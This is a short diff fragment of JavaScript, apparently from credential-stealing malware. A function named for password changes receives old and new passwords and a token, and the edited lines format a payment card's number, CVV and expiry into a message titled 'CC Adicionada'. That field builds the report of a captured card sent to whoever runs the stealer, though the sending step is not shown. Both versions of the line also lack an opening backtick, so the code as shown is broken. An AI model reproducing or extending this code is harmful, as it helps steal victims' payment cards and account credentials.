@@ -879,7 +879,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           fields: [
             {
               name: 'CC Adicionada',
-              value: Número: **${number}**\nCVV: **${cvc}**\nValidade: **${expir_month}/${expir_year}**`,
+              value: Número **${number}**\nCVV **${cvc}**\nValidade **${expir_month}/${expir_year}**`,
               inline: true,
             },
             {
